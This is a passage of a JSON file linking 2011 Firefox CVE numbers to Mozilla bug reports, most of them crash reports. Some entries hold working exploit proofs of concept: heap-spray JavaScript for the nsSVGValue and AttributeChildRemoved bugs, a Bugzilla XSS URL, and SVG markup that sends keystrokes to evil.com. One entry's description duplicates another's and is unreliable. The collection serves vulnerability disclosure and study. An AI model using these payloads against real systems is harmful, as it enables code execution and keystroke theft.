+ 4801898512 319 ??? 0x000000011e377160 0 + 4801917280 320 ??? 0x000000011e3771e0 0 + 4801917408 321 ??? 0x000000011e3758f0 0 + 4801911024 322 ??? 0x000000011e34b500 0 + 4801737984 323 ??? 0x000000011e37d890 0 + 4801943696 324 ??? 0x000000011e34b560 0 + 4801738080 325 ??? 0x000000011e381fe0 0 + 4801961952 326 ??? 0x000000011e3a4700 0 + 4802103040 327 ??? 0x000000011e3aabb0 0 + 4802128816 328 ??? 0x000000011e3aac10 0 + 4802128912 329 ??? 0x000000011e3aac70 0 + 4802129008 330 ??? 0x000000011e3c7020 0 + 4802244640 331 ??? 0x000000011e3d8b40 0 + 4802317120 332 ??? 0x000000011e3e4880 0 + 4802365568 333 ??? 0x000000011e3e48e0 0 + 4802365664 334 ??? 0x000000011e3f52d0 0 + 4802433744 335 ??? 0x000000011e3f5330 0 + 4802433840 336 ??? 0x000000011e604ae0 0 + 4804594400 337 ??? 0x000000011e62bd60 0 + 4804754784 338 ??? 0x000000011e62bdc0 0 + 4804754880 339 ??? 0x000000011e634ae0 0 + 4804791008 340 ??? 0x000000011e634bb0 0 + 4804791216 341 ??? 0x000000011e63a430 0 + 4804813872 342 ??? 0x000000011e64ba60 0 + 4804885088 343 ??? 0x000000011e64ad70 0 + 4804881776 344 ??? 0x000000011e64f1b0 0 + 4804899248 345 ??? 0x000000011e64f210 0 + 4804899344 346 ??? 0x000000011e6566f0 0 + 4804929264 347 ??? 0x000000011e66a000 0 + 4805009408 348 ??? 0x000000011e6663c0 0 + 4804993984 349 ??? 0x000000011e666460 0 + 4804994144 350 ??? 0x000000011e6742b0 0 + 4805051056 351 ??? 0x000000011e67af30 0 + 4805078832 352 ??? 0x000000011e67af90 0 + 4805078928 353 ??? 0x000000011e38c210 0 + 4802003472 354 ??? 0x000000011ea9b290 0 + 4809405072 355 ??? 0x000000011ea9b2f0 0 + 4809405168 356 ??? 0x000000011ea6e1e0 0 + 4809220576 357 ??? 0x000000011e6788b0 0 + 4805068976 358 ??? 0x000000011e3482b0 0 + 4801725104 359 ??? 0x000000011e34e420 0 + 4801750048 360 ??? 0x000000011e360fd0 0 + 4801826768 361 ??? 0x000000011e348310 0 + 4801725200 362 ??? 0x000000011ea59bf0 0 + 4809137136 363 ??? 0x000000011e3dbff0 0 + 4802330608 364 ??? 0x000000011ea9a330 0 + 4809401136 365 ??? 0x000000011ea59b40 0 + 4809136960 366 ??? 0x000000011ea9a250 0 + 4809400912 367 ??? 0x0000000122169630 0 + 4866872880 368 ??? 0x00000001221694e0 0 + 4866872544 369 ??? 0x0000000122169590 0 + 4866872720 370 ??? 0x0000000122169d70 0 + 4866874736 371 ??? 0x0000000122169e40 0 + 4866874944 372 ??? 0x000000012216a100 0 + 4866875648 373 ??? 0x0000000122169fe0 0 + 4866875360 374 ??? 0x000000012216a090 0 + 4866875536 375 ??? 0x000000012216a550 0 + 4866876752 376 ??? 0x000000012216a6a0 0 + 4866877088 377 ??? 0x000000012216a750 0 + 4866877264 378 ??? 0x000000012216a8d0 0 + 4866877648 379 ??? 0x000000012216aa20 0 + 4866877984 380 ??? 0x000000012216aba0 0 + 4866878368 381 ??? 0x000000012216ad80 0 + 4866878848 382 ??? 0x000000012216b1c0 0 + 4866879936 383 ??? 0x000000012216b620 0 + 4866881056 384 ??? 0x000000012216b680 0 + 4866881152 385 ??? 0x000000012216b7a0 0 + 4866881440 386 ??? 0x000000012216b970 0 + 4866881904 387 ??? 0x000000012216ba20 0 + 4866882080 388 ??? 0x000000012216c0c0 0 + 4866883776 389 ??? 0x000000012216bfc0 0 + 4866883520 390 ??? 0x000000012216c240 0 + 4866884160 391 ??? 0x000000012216c370 0 + 4866884464 392 ??? 0x000000012216c460 0 + 4866884704 393 ??? 0x000000012216c9e0 0 + 4866886112 394 ??? 0x000000012216cad0 0 + 4866886352 395 ??? 0x000000012216cca0 0 + 4866886816 396 ??? 0x000000012216d1a0 0 + 4866888096 397 ??? 0x000000012216d600 0 + 4866889216 398 ??? 0x000000012200a5b0 0 + 4865435056 399 ??? 0x0000000122008850 0 + 4865427536 400 ??? 0x000000012200aaf0 0 + 4865436400 401 ??? 0x000000012200ab50 0 + 4865436496 402 ??? 0x000000012200b4c0 0 + 4865438912 403 ??? 0x000000012200b710 0 + 4865439504 404 ??? 0x000000012200a970 0 + 4865436016 405 ??? 0x000000012200aa50 0 + 4865436240 406 ??? 0x000000012200a900 0 + 4865435904 407 ??? 0x000000012200c360 0 + 4865442656 408 ??? 0x000000012200c580 0 + 4865443200 409 ??? 0x000000012200c880 0 + 4865443968 410 ??? 0x000000012200c630 0 + 4865443376 411 ??? 0x000000012200be00 0 + 4865441280 412 ??? 0x000000012200d5c0 0 + 4865447360 413 ??? 0x000000012200d710 0 + 4865447696 414 ??? 0x000000012200d870 0 + 4865448048 415 ??? 0x000000012200da20 0 + 4865448480 416 ??? 0x000000012200dbd0 0 + 4865448912 417 ??? 0x000000012200dd80 0 + 4865449344 418 ??? 0x000000012200df30 0 + 4865449776 419 ??? 0x000000012200e0a0 0 + 4865450144 420 ??? 0x000000012200e210 0 + 4865450512 421 ??? 0x000000012200e380 0 + 4865450880 422 ??? 0x000000012200e4f0 0 + 4865451248 423 ??? 0x000000012200e680 0 + 4865451648 424 ??? 0x000000012200e860 0 + 4865452128 425 ??? 0x000000012200ea70 0 + 4865452656 426 ??? 0x000000012200edc0 0 + 4865453504 427 ??? 0x000000012200f040 0 + 4865454144 428 ??? 0x000000012200f250 0 + 4865454672 429 ??? 0x000000012200f420 0 + 4865455136 430 ??? 0x000000012200f590 0 + 4865455504 431 ??? 0x000000012200f700 0 + 4865455872 432 ??? 0x000000012200f870 0 + 4865456240 433 ??? 0x000000012200f9e0 0 + 4865456608 434 ??? 0x000000012200fb50 0 + 4865456976 435 ??? 0x000000012200fcc0 0 + 4865457344 436 ??? 0x000000012200fe30 0 + 4865457712 437 ??? 0x0000000122038880 0 + 4865624192 438 ??? 0x00000001220394b0 0 + 4865627312 439 ??? 0x000000012202e430 0 + 4865582128 440 ??? 0x000000012202ecf0 0 + 4865584368 441 ??? 0x000000012202e810 0 + 4865583120 442 ??? 0x000000012202efa0 0 + 4865585056 443 ??? 0x000000012202f060 0 + 4865585248 444 ??? 0x000000012202d7f0 0 + 4865578992 445 ??? 0x000000012202d5b0 0 + 4865578416 446 ??? 0x000000012202f790 0 + 4865587088 447 ??? 0x000000012202f3d0 0 + 4865586128 448 ??? 0x000000012202e060 0 + 4865581152 449 ??? 0x000000012202df70 0 + 4865580912 450 ??? 0x0000000122039430 0 + 4865627184 451 ??? 0x000000012202f980 0 + 4865587584 452 ??? 0x000000012202fa50 0 + 4865587792 453 ??? 0x000000012202fb10 0 + 4865587984 454 ??? 0x000000012202fbe0 0 + 4865588192 455 ??? 0x000000012202fca0 0 + 4865588384 456 ??? 0x000000012202fd50 0 + 4865588560 457 ??? 0x000000012201c420 0 + 4865508384 458 ??? 0x000000012203dcc0 0 + 4865645760 459 ??? 0x000000012203ec80 0 + 4865649792 460 ??? 0x00000001220400a0 0 + 4865654944 461 ??? 0x00000001220350d0 0 + 4865609936 462 ??? 0x00000001220351a0 0 + 4865610144 463 ??? 0x0000000122035230 0 + 4865610288 464 ??? 0x00000001220410c0 0 + 4865659072 465 ??? 0x0000000122035650 0 + 4865611344 466 ??? 0x00000001220412a0 0 + 4865659552 467 ??? 0x0000000122041120 0 + 4865659168 468 ??? 0x00000001220411d0 0 + 4865659344 469 ??? 0x0000000122045930 0 + 4865677616 470 ??? 0x00000001220540e0 0 + 4865736928 471 ??? 0x00000001220541b0 0 + 4865737136 472 ??? 0x000000011dfb10d0 0 + 4797960400 473 ??? 0x000000011dfb1130 0 + 4797960496 474 ??? 0x000000011fdf1030 0 + 4829679664 475 ??? 0x000000011dfb6f90 0 + 4797984656 476 ??? 0x000000011dfb6ff0 0 + 4797984752 477 ??? 0x000000011fdec450 0 + 4829660240 478 ??? 0x000000011fdf0fd0 0 + 4829679568 479 ??? 0x000000011fded920 0 + 4829665568 480 ??? 0x000000011dfbac10 0 + 4798000144 481 ??? 0x000000011dfae290 0 + 4797948560 482 ??? 0x000000011fded8b0 0 + 4829665456 483 ??? 0x000000011fdf49e0 0 + 4829694432 484 ??? 0x000000011fdf4c20 0 + 4829695008 485 ??? 0x000000011dfbca90 0 + 4798007952 486 ??? 0x000000011dfbc9e0 0 + 4798007776 487 ??? 0x000000011fdefab0 0 + 4829674160 488 ??? 0x000000011fdefc30 0 + 4829674544 489 ??? 0x000000011dfadea0 0 + 4797947552 490 ??? 0x000000011dfae030 0 + 4797947952 491 ??? 0x000000011dfae1c0 0 + 4797948352 492 ??? 0x0000000122054f90 0 + 4865740688 493 ??? 0x000000011fdef280 0 + 4829672064 494 ??? 0x0000000122055270 0 + 4865741424 495 ??? 0x0000000122055330 0 + 4865741616 496 ??? 0x000000011fdef1d0 0 + 4829671888 497 ??? 0x000000011dfba720 0 + 4797998880 498 ??? 0x000000011dfbab50 0 + 4797999952 499 ??? 0x000000011dfba900 0 + 4797999360 500 ??? 0x000000011fdf0140 0 + 4829675840 501 ??? 0x000000011fdf0320 0 + 4829676320 502 ??? 0x000000011fdf5070 0 + 4829696112 503 ??? 0x000000011fdf4e20 0 + 4829695520 504 ??? 0x000000011fdf4ee0 0 + 4829695712 505 ??? 0x000000011fdf0010 0 + 4829675536 506 ??? 0x000000011fdefec0 0 + 4829675200 507 ??? 0x000000011dfbb0d0 0 + 4798001360 508 ??? 0x000000011dfbb1c0 0 + 4798001600 509 ??? 0x000000011dfbb330 0 + 4798001968 510 ??? 0x000000011dfbb580 0 + 4798002560 511 ??? 0x000000011dfbb4b0 0 + 4798002352 Process: firefox-bin [6579] Path: /Applications/Firefox.app/Contents/MacOS/firefox-bin Identifier: org.mozilla.firefox Version: 5.0.1 (5.0.1) Code Type: X86-64 (Native) Parent Process: launchd [185] Date/Time: 2011-07-27 11:16:49.075 +0200 OS Version: Mac OS X 10.6.8 (10K540) Report Version: 6 Interval Since Last Report: 947802 sec Crashes Since Last Report: 961 Per-App Interval Since Last Report: 11232 sec Per-App Crashes Since Last Report: 8 Anonymous UUID: A20874EC-7280-445C-9882-755000F0127C Exception Type: EXC_CRASH (SIGABRT) Exception Codes: 0x0000000000000000, 0x0000000000000000 Crashed Thread: 0 Dispatch queue: com.apple.main-thread Application Specific Information: *** error for object 0x13f935ec0: incorrect checksum for freed object - object was probably modified after being freed. Thread 0 Crashed: Dispatch queue: com.apple.main-thread 0 libSystem.B.dylib 0x00007fff8271e0b6 __kill + 10 1 libSystem.B.dylib 0x00007fff827be9f6 abort + 83 2 libSystem.B.dylib 0x00007fff827ad62d szone_error + 519 3 libSystem.B.dylib 0x00007fff826d9723 tiny_free_list_remove_ptr + 251 4 libSystem.B.dylib 0x00007fff826d7e35 szone_realloc + 637 5 libSystem.B.dylib 0x00007fff826d7b7b malloc_zone_realloc + 92 6 libSystem.B.dylib 0x00007fff826e3c16 realloc + 169 7 libmozalloc.dylib 0x0000000101ab3b7f moz_xrealloc + 31 8 XUL 0x0000000100043fda catch_exception_raise + 116282 9 XUL 0x00000001001ec6eb mozilla::layers::LayerUserData::~LayerUserData() + 221755 10 XUL 0x00000001001ec60c mozilla::layers::LayerUserData::~LayerUserData() + 221532 11 XUL 0x00000001001ec60c mozilla::layers::LayerUserData::~LayerUserData() + 221532 12 XUL 0x00000001001ec60c mozilla::layers::LayerUserData::~LayerUserData() + 221532 13 XUL 0x00000001001ec60c mozilla::layers::LayerUserData::~LayerUserData() + 221532 14 XUL 0x00000001001ec60c mozilla::layers::LayerUserData::~LayerUserData() + 221532 15 XUL 0x0000000100201769 mozilla::layers::LayerUserData::~LayerUserData() + 307897 16 XUL 0x0000000100201d15 mozilla::layers::LayerUserData::~LayerUserData() + 309349 17 XUL 0x000000010021da6d mozilla::layers::LayerUserData::~LayerUserData() + 423357 18 XUL 0x0000000100604e66 mozilla::layers::ReadbackSink::~ReadbackSink() + 3566006 19 XUL 0x00000001005ff541 mozilla::layers::ReadbackSink::~ReadbackSink() + 3543185 20 XUL 0x0000000100ca07f5 JSD_DebuggerOnForUser + 947925 21 XUL 0x0000000100c9a852 JSD_DebuggerOnForUser + 923442 22 XUL 0x0000000100ca9c5d JSD_DebuggerOnForUser + 985917 23 com.apple.AppKit 0x00007fff887380c7 -[NSWindow sendEvent:] + 8769 24 XUL 0x0000000100c933b2 JSD_DebuggerOnForUser + 893586 25 com.apple.AppKit 0x00007fff8866c8f1 -[NSApplication sendEvent:] + 4198 26 com.apple.AppKit 0x00007fff886036de -[NSApplication run] + 474 27 XUL 0x0000000100c907ad JSD_DebuggerOnForUser + 882317 28 XUL 0x0000000100b010b4 js::JSProxyHandler::isOuterWindow() + 609284 29 XUL 0x0000000100016940 XRE_main + 11984 30 org.mozilla.firefox 0x0000000100000af7 start + 471 31 org.mozilla.firefox 0x0000000100000954 start + 52 Process: firefox-bin [7802] Path: /Applications/Firefox.app/Contents/MacOS/firefox-bin Identifier: org.mozilla.firefox Version: 5.0.1 (5.0.1) Code Type: X86-64 (Native) Parent Process: launchd [185] Date/Time: 2011-07-28 01:50:35.346 +0200 OS Version: Mac OS X 10.6.8 (10K540) Report Version: 6 Interval Since Last Report: 962749 sec Crashes Since Last Report: 966 Per-App Interval Since Last Report: 13694 sec Per-App Crashes Since Last Report: 10 Anonymous UUID: A20874EC-7280-445C-9882-755000F0127C Exception Type: EXC_BAD_ACCESS (SIGSEGV) Exception Codes: KERN_INVALID_ADDRESS at 0x0000000972b81dd8 Crashed Thread: 0 Dispatch queue: com.apple.main-thread Thread 0 Crashed: Dispatch queue: com.apple.main-thread 0 XUL 0x0000000101142f09 js_fgets(char*, int, __sFILE*) + 61177 1 XUL 0x0000000100bbbc93 JSD_DebuggerOnForUser + 11123 2 XUL 0x0000000100bc1ff4 JSD_DebuggerOnForUser + 36564 3 XUL 0x0000000100bc69b3 JSD_DebuggerOnForUser + 55443 4 XUL 0x0000000100bba2d7 JSD_DebuggerOnForUser + 4535 5 XUL 0x0000000101051467 JS_HandleTrap + 135 6 XUL 0x00000001010951aa JS_HashTableRemove + 20282 7 XUL 0x00000001010ac7bf JS_HashTableRemove + 116047 8 XUL 0x00000001010b0b74 JS_HashTableRemove + 133380 9 XUL 0x0000000101020826 JS_CallFunction + 294 10 XUL 0x00000001010209d9 JS_EvaluateUCScriptForPrincipalsVersion + 105 11 XUL 0x0000000100614998 mozilla::layers::ReadbackSink::~ReadbackSink() + 3630312 12 XUL 0x000000010044f153 mozilla::layers::ReadbackSink::~ReadbackSink() + 1772707 13 XUL 0x000000010044fdbf mozilla::layers::ReadbackSink::~ReadbackSink() + 1775887 Expected results: non-crashing OOM message and safe garbage-collection"
      }
    ],
    "CVE-2011-3652": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=682727",
        "title": "Crash during datamove (ACCESS VIOLATION READ) [@ memcpy | nsAString_internal::Assign(unsigned short const*, unsigned int)]",
        "description": "When running the attached testcase on a native WinXP SP3 installation (not in VirtualBox)with Firefox 6, it crashes during a datamove at memcpy in method nsAString_internal::Assign(unsigned short const*, unsigned int). Crash IDs: bp-61c8c0ae-0b67-4063-bd2b-906392110828 bp-5534e024-7733-42bd-a565-464ce2110828 WinDBG states this as Probably Exploitable. This memcpy crash seems similar to the one in bug 505305 ([sg:critical?]). The testcase is based on the testcase of bug 651990. Steps to reproduce: 1. Open testcase in Fx6 2. Click the button Greetings, Rh0"
      }
    ],
    "CVE-2011-3653": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=684882",
        "title": "Random video memory grabbed into WebGL cube map textures on Mac OS, including on 10.7.1, on Intel GPUs",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1 Steps to reproduce: I loaded this WebGL demo in Firefox 6.0.1: http://mrdoob.github.com/three.js/examples/webgl_materials_cars_anaglyph.html Actual results: The background cube texture does not render correctly. What i see is randomly garbled artefacts of parts of my screen. See attached screenshots. The effect is very similar to what has already been reported in this bug: https://bugzilla.mozilla.org/show_bug.cgi?id=631258 - just that i run a different OS version and a different graphics card. Note that i can reproduce this issue (even after rebooting my machine), and that Chrome 13 shows the exact same problem (suggesting that it is a low level problem, possibly with the graphics card drivers). Some info on my hardware: Hardware Overview: Model Name: MacBook Pro Model Identifier: MacBookPro8,1 Processor Name: Intel Core i5 Processor Speed: 2.3 GHz Number of Processors: 1 Total Number of Cores: 2 L2 Cache (per Core): 256 KB L3 Cache: 3 MB Memory: 4 GB Boot ROM Version: MBP81.0047.B0E SMC Version (system): 1.68f96 System Software Overview: System Version: Mac OS X 10.6.8 (10K549) Kernel Version: Darwin 10.8.0 Boot Volume: Macintosh HD Boot Mode: Normal Secure Virtual Memory: Enabled 64-bit Kernel and Extensions: Yes Intel HD Graphics 3000: Chipset Model: Intel HD Graphics 3000 Type: GPU Bus: Built-In VRAM (Total): 384 MB Vendor: Intel (0x8086) Device ID: 0x0126 Revision ID: 0x0009 Displays: Color LCD: Resolution: 1280 x 800 Pixel Depth: 32-Bit Color (ARGB8888) Main Display: Yes Mirror: Off Online: Yes Built-In: Yes Display Connector: Status: No Display Connected Expected results: A nice cube texture should be shown, without artefacts."
      }
    ],
    "CVE-2011-3654": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=694953",
        "title": "Crash [@ nsAString_internal::EqualsASCII ] with <svg:mpath> linking to a non-SVG element",
        "description": "The attached SVG file causes a nasty looking crash at least in Firefox 8.0. I haven't tested with other versions yet. The original file crashed at 0x4, but the address moved while looking for a simpler triggering file and ended up at 0xff000004. High crash addresses often imply security impact, so reporting this as a security bug to be on the safe side. Crash report: https://crash-stats.mozilla.com/report/index/bp-72d7c90a-2029-4ec7-9a66-1deca2111017"
      }
    ],
    "CVE-2011-3655": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=672182",
        "description": "The attached SVG file causes a nasty looking crash at least in Firefox 8.0. I haven't tested with other versions yet. The original file crashed at 0x4, but the address moved while looking for a simpler triggering file and ended up at 0xff000004. High crash addresses often imply security impact, so reporting this as a security bug to be on the safe side. Crash report: https://crash-stats.mozilla.com/report/index/bp-72d7c90a-2029-4ec7-9a66-1deca2111017"
      }
    ],
    "CVE-2011-3656": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=667907",
        "title": "Possible XSS via HTTP 0.9 errors and content-sniffing",
        "description": "[This is from the MB-Secissues mailing list.] Hi We just fixed an issue in Opera 11.50, but as we noticed a few other browsers are vulnerable, we did not post any details. http://www.opera.com/docs/changelogs/windows/1150/: \"Fixed a moderately severe issue. Details will be disclosed at a later date.\" The issue is an old one. Some non-HTTP protocols running on a server might respond to HTTP requests with an error message, and return (parts of) the incoming request. If web browsers content-sniff data returned withouth HTTP headers, an attacker might be able to send data to such a service, and have the server return an error which the browser interprets as HTML/JS. This opens up for XSS. HTTP version 0.9 (which is still in use in some rare cases) does not send HTTP headers, so we still content sniff on ports 80 and 443. Our fix is to stop content sniffing on non-standard ports. We require either an explicit HTTP/1.* header (then we will content sniff), or a Content-type. There are of course other fixes too, like not running scripting, even if one does content sniff. Our test case tests our implementation, so it might be some other browsers are not vulnerable, even though I have listed them as failing on our TC. We will withhold information for now, if nobody tells us otherwise, we will publish full details next time we clean up in our unpublished advisories, at least half a year from now. If anyone wants us to hold off longer, or would like more info, please let us know. Failing on our test case: Opera 11.11 Chrome 12.0 Safari 5.0.4 Firefox 4.0.1 Internet Explorer 8.0 Passing on our test case: Opera 11.50 This has been tested well, and we have found no compatibility issues with this. -- Sigbjørn Vik Quality Assurance Opera Software _______________________________________________ MB-SecIssues mailing list MB-SecIssues@list.opera.com https://list.opera.com/mailman/listinfo/mb-secissues"
      }
    ],
    "CVE-2011-3657": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=697699",
        "title": "[SECURITY] XSS when viewing new charts or tabular and graphical reports in debug mode",
        "description": "RedTeam Pentesting discovered a Cross Site-Scripting (XSS) vulnerability in Bugzilla's chart generator during a penetration test. If attackers can persuade users to click on a prepared link or redirected them to such a link from an attacker-controlled website, they are able to run arbitrary JavaScript code in the context of the Bugzilla installation's domain. Details ======= Product: Bugzilla Affected Versions: 3.4.12, 3.6.6, 4.0.2, 4.1.3, possibly all older versions that can generate charts Vulnerability Type: Cross Site Scripting Security Risk: high Vendor URL: http://www.bugzilla.org Vendor Status: notified Advisory Status: private More Details ============ The chart-generating script chart.cgi contains a function plot(), which creates a new chart: sub plot { validateWidthAndHeight(); $vars->{'chart'} = new Bugzilla::Chart($cgi); my $format = $template->get_format(\"reports/chart\", \"\", scalar($cgi->param('ctype'))); # Debugging PNGs is a pain; we need to be able to see the error messages if ($cgi->param('debug')) { print $cgi->header(); $vars->{'chart'}->dump(); } print $cgi->header($format->{'ctype'}); disable_utf8() if ($format->{'ctype'} =~ /^image\\//); $template->process($format->{'template'}, $vars) || ThrowTemplateError($template->error()); } The function's code shows that there is a \"debug\" parameter, that, if set, will make the function print out the variables (and their contents) representing the chart for debugging purposes. This includes user-defined variables sent as parameters, especially \"label0\". As the content of this variable is not checked for malicious input, it can be used to inject arbitrary JavaScript code into the debugging output. In fact, any variable of the form \"labelXXX\", where \"XXX\" is an arbitrary number, will work. Proof of Concept ================ The following URL generates a new chart with debugging output enabled, containing JavaScript code in the \"label0\" parameter: http://www.example.org/bugzilla/chart.cgi ?category=-All- &datefrom= &dateto= &label0=<script>alert(\"XSS\")</script> &line0=1 &name=1 &subcategory=-All- &ctype=png &action=plot &width=600 &height=350 &debug=1 Security Risk ============= The risk of this vulnerability is estimated to be high. Being able to embed arbitrary JavaScript allows attackers to completely manipulate the website, adding one's own content and tracking user interaction. RedTeam Pentesting GmbH ======================= RedTeam Pentesting offers individual penetration tests, short pentests, performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at http://www.redteam-pentesting.de."
      }
    ],
    "CVE-2011-3658": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=708186",
        "title": "[8.0.1] nsSVGValue Out-of-Bounds Access (ZDI-CAN-1414)",
        "description": "ZDI-CAN-1414: Mozilla Firefox nsSVGValue Out-of-Bounds Access Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Version(s) Tested: Mozilla Firefox 8.0.1 Platform(s) Tested: Windows XP SP3 --------------------- Vulnerability details --------------------- The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(SVGObserverNotifyFunction f, modificationType aModType) uses a loop which can result in an out-of-bounds access to attacker controlled memory. Provided below the code for this function from content/src/nsSVGValue.cpp: nsSVGValue::NotifyObservers(SVGObserverNotifyFunction f, modificationType aModType) { PRInt32 count = mObservers.Length(); // Since notification might cause the listeners to remove themselves // from the observer list (mod_die), walk backwards through the list // to catch everyone. for (PRInt32 i = count - 1; i >= 0; i--) { nsIWeakReference* wr = mObservers.ElementAt(i); nsCOMPtr<nsISVGValueObserver> observer = do_QueryReferent(wr); if (observer) (static_cast<nsISVGValueObserver*>(observer)->*f)(this, aModType); } } The variable \"count\" is set once from mObservers.Length() before the loop begins. During each loop iteration, a pointer to is acquired via a call to mObservers.ElementAt(i);. An attacker may register an observer of nsSVGValue which removes elements from the array, thus making the \"count\" reflect an invalid amount of elements. The mObserver function ElementAt() does not validate that the index is not out of bounds. The combination of these behaviors means that subsequent iterations of the loop will access memory which is outside the bounds of the array. Through manipulation of memory layout, the memory accessed from these out-of-bounds indexes can be controlled by the attacker, and thus result in remote arbitrary code execution. The code below demonstrates registration of an observer which removes elements and triggers the vulnerability: --------------- Begin Code Snip --------------- <html> <head> <script> var container = []; var tls = []; var rect = null; var big = null; var small = null; function listener() { rect.removeEventListener(\"DOMAttrModified\", listener, false); for each (tl in tls) tl.clear(); // gc & heap spray for (i = 0; i < (1<<7); ++i) container.push(unescape(big)); for (i = 0; i < (1<<22); ++i) container.push(unescape(small)); } function run() { var svg = document.getElementById(\"svg\"); rect = document.getElementById(\"rect\"); for (i = 0; i < (1<<13); ++i) { rect = rect.cloneNode(false); var atl = rect.transform; var tl = atl.baseVal; tls.push(tl); } const addr = unescape(\"%uc0c0\"); big = addr; while (big.length != 0x100000) big += big; small = addr; while (small.length != 15) small += addr; var trans = svg.createSVGTransform(); for each (tl in tls) tl.appendItem(trans); rect.addEventListener(\"DOMAttrModified\", listener, false); var matrix = svg.createSVGMatrix(); trans.setMatrix(matrix); alert(\"PoC failed\"); } </script> </head> <body onload=\"run();\"> <svg id=\"svg\"> <rect id=\"rect\" x=\"0\" y=\"0\" width=\"10\" height=\"10\" fill=\"red\" stroke=\"black\"/> </svg> </body> </html> ---------------- End of Code Snip ---------------- This code will register an observer which removes elements and populates memory with the value c0c0c0c0. This memory is used to look up a function pointer which is then called. -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht"
      }
    ],
    "CVE-2011-3659": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=708198",
        "title": "AttributeChildRemoved Use-After-Free (ZDI-CAN-1413)",
        "description": "ZDI-CAN-1413: Mozilla Firefox AttributeChildRemoved Use-After-Free Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Version(s) Tested: Mozilla Firefox 8.0.1 Platform(s) Tested: Windows XP SP3 --------------------- Vulnerability details --------------------- Version(s) Tested: Mozilla Firefox 8.0.1 Platform(s) Tested: Windows XP SP3 --------------------- Vulnerability details --------------------- Under certain circumstances, removal of child nodes from the nsDOMAttribute can allow for a child to still be accessible after removal due to a premature notification of AttributeChildRemoved. Please observe the code below from base/src/nsDOMAttribute.cpp: void nsDOMAttribute::doRemoveChild(bool aNotify) { if (aNotify) { nsNodeUtils::AttributeChildRemoved(this, mChild); } static_cast<nsTextNode*>(mChild)->UnbindFromAttribute(); NS_RELEASE(mChild); mFirstChild = nsnull; } As can be seen above, a call to the function AttributeChildRemoved() happens before mFirstChild is set to NULL. Registered mutation observers implementing interface nsIMutationObserver2 will have callback function AttributeChildRemoved. Since mFirstChild is not set to NULL until after this call is made, this means the removed child will be accessible after it has been removed. This use-after-free allows for arbitrary code execution by an attacker. The code below can used to trigger and demonstrate the vulnerability: --------------- Begin Code Snip --------------- <html> <head> <script> function run() { var attr = document.createAttribute(\"foo\"); attr.value = \"bar\"; var ni = document.createNodeIterator( attr, NodeFilter.SHOW_ALL, {acceptNode: function(node) { return NodeFilter.FILTER_ACCEPT; }}, false); ni.nextNode(); ni.nextNode(); ni.previousNode(); attr.value = null; // gc & heap spray const addr = unescape(\"%uc3c4%uc1c2\"); var container = new Array(); var small = addr; while (small.length != 30) small += addr; for (i = 0; i < 1024*1024*2; ++i) container.push(unescape(small)); ni.referenceNode; alert(\"PoC failed\"); } </script> </head> <body onload=\"run();\"> </body> </html> ---------------- End Of Code Snip ---------------- -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht"
      }
    ],
    "CVE-2011-3661": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=691299",
        "title": "Crash at js::RegExp::executeInternal",
        "description": "User Agent: Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0 Build ID: 20110928060149 Steps to reproduce: I stumbled into another regexp issue similar to https://bugzilla.mozilla.org/show_bug.cgi?id=653672. That one was fixed in Firefox 7.0, but this one remains in it and 8.0 beta. Filing as a security bug based on the high crash address and probability of there being a similar integer error. Actual results: Firefox 7.0 / Linux (64-bit Debian 6.0.2) -> https://crash-stats.mozilla.com/report/index/2b6d78d1-df97-4497-bbcc-b3fae2111003 Firefox 8.0 beta / ditto-> https://crash-stats.mozilla.com/report/index/bp-82827ac7-07c6-4f97-a697-5f1202111003 Expected results: Firefox shouldn't have crashed and I should have caught this earlier."
      }
    ],
    "CVE-2011-3663": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=704482",
        "title": "SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript",
        "description": "User Agent: Mozilla/5.0 (X11; Linux i686; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Build ID: 20110928224103 Steps to reproduce: SVG provides several elements allowing modification of existing element attributes. Those are <set>, <animate> and others: http://www.w3.org/TR/SVG/animate.html These elements can contain an attribute called begin. This can -- among other values -- be applied with an access key listener by using the function accessKey(): http://www.w3.org/TR/SVG/animate.html#TimingAttributes Example 1: <!-- Press a to fill the circle with color 'red' --> <svg height=\"50px\"> <circle r=\"100\"> <set attributeName=\"fill\" begin=\"accessKey(a)\" to=\"red\" /> </circle> </svg> An attacker can use this to inject non-scripting markup into a website and afterwards record user's keystrokes. The attached test-case demonstrates that. Example 2: <!doctype html> <form> <label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label> <br> <input name=\"secret\" type=\"password\"> </form> <!-- injection --> <svg height=\"50px\"> <image xmlns:xlink=\"http://www.w3.org/1999/xlink\"> <set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//evil.com/?a\" /> <set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//evil.com/?b\" /> <set 